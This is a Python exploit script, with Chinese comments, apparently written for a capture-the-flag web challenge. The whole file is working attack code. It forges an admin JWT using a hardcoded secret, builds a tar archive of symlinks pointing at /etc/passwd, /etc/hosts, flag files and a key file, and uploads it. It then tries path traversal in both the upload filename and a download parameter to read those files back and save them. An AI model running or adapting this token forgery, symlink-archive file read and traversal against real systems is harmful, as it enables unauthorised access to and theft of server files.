#!/usr/bin/env python3
"""
创建包含软链接的tar文件并尝试利用
"""

import tarfile
import os
import requests
import jwt
from datetime import datetime, timedelta, timezone

BASE_URL = "http://192.168.18.25:25004"
JWT_SECRET = "secret-secret-secret-secret-secret-secret-secret-secret-secret-secret-secret"

def create_admin_session():
    payload = {
        "sub": "admin",
        "exp": datetime.now(timezone.utc) + timedelta(minutes=30)
    }
    token = jwt.encode(payload, JWT_SECRET, algorithm="HS512")
    session = requests.Session()
    session.cookies.set("jwt", token)
    return session

def create_symlink_tar():
    """创建包含软链接的tar文件"""
    print("[*] 创建包含软链接的tar文件...")
    
    # 在Windows上创建tar比较麻烦，直接用Python的tarfile模块
    tar_path = "symlink_attack.tar"
    
    with tarfile.open(tar_path, 'w') as tar:
        # 创建一个指向 /etc/passwd 的软链接
        tarinfo = tarfile.TarInfo(name='passwd_link.txt')
        tarinfo.type = tarfile.SYMTYPE  # 软链接类型
        tarinfo.linkname = '/etc/passwd'  # 指向的目标
        tarinfo.mode = 0o777
        tar.addfile(tarinfo)
        
        # 再加几个其他系统文件的链接
        targets = [
            ('flag_link.txt', '/flag'),
            ('flag_link2.txt', '/flag.txt'),
            ('root_flag.txt', '/root/flag'),
            ('tmp_flag.txt', '/tmp/flag'),
            ('key_link.txt', '../ﾎﾝ.key'),
            ('hosts_link.txt', '/etc/hosts'),
        ]
        
        for name, target in targets:
            tarinfo = tarfile.TarInfo(name=name)
            tarinfo.type = tarfile.SYMTYPE
            tarinfo.linkname = target
            tarinfo.mode = 0o777
            tar.addfile(tarinfo)
    
    print(f"[+] 创建成功: {tar_path}")
    return tar_path

def upload_tar(session, tar_path):
    """上传tar文件"""
    print(f"\n[*] 上传 {tar_path} 到 uploads 目录...")
    
    with open(tar_path, 'rb') as f:
        files = {'file': (tar_path, f, 'application/x-tar')}
        r = session.post(f"{BASE_URL}/dashboard/upload", files=files)
        
        if r.status_code == 200:
            print(f"[+] 上传成功!")
            return True
        else:
            print(f"[!] 上传失败: {r.status_code}")
            print(f"    响应: {r.text[:200]}")
            return False

def upload_to_backup(session, tar_path):
    """上传tar到backup目录"""
    print(f"\n[*] 尝试直接上传到 backup/out.tar...")
    
    # 读取tar内容
    with open(tar_path, 'rb') as f:
        tar_data = f.read()
    
    # 尝试通过路径遍历上传
    files = {'file': ('..%2fbackup%2fout.tar', tar_data, 'application/x-tar')}
    r = session.post(f"{BASE_URL}/dashboard/upload", files=files)
    
    print(f"    状态: {r.status_code}")
    print(f"    响应: {r.text[:200]}")

def try_read_symlinks(session):
    """尝试读取上传的软链接"""
    print("\n[*] 尝试读取软链接文件...")
    
    links = [
        'uploads/passwd_link.txt',
        'uploads/flag_link.txt',
        'uploads/flag_link2.txt',
        'uploads/root_flag.txt',
        'uploads/tmp_flag.txt',
        'uploads/key_link.txt',
        'uploads/hosts_link.txt',
    ]
    
    for link in links:
        encoded = link.replace('/', '%2f')
        url = f"{BASE_URL}/download?path=uploads%2f..%2f{encoded}"
        
        print(f"\n[*] 读取: {link}")
        r = session.get(url)
        
        if r.status_code == 200:
            print(f"[+] 成功! 内容:")
            print(r.text[:500])
            
            # 保存
            filename = link.split('/')[-1]
            with open(f"symlink_{filename}", 'w') as f:
                f.write(r.text)
            print(f"[+] 已保存到 symlink_{filename}")
        else:
            print(f"[!] 失败: {r.status_code}")

def main():
    session = create_admin_session()
    
    # 1. 创建包含软链接的tar
    tar_path = create_symlink_tar()
    
    # 2. 上传tar文件
    upload_tar(session, tar_path)
    
    # 3. 尝试上传到backup目录
    upload_to_backup(session, tar_path)
    
    # 4. 尝试读取软链接
    # 注意：如果上传的是tar文件，需要先解压才能访问链接
    # 但我们没有BackUpServlet的key
    try_read_symlinks(session)
    
    print("\n[*] 说明:")
    print("    - 如果直接上传软链接文件，它们会作为普通文件上传（内容为空）")
    print("    - 需要使用tar格式上传并在服务器端解压才能保留软链接")
    print("    - BackUpServlet可以解压tar，但需要key")

if __name__ == "__main__":
    main()
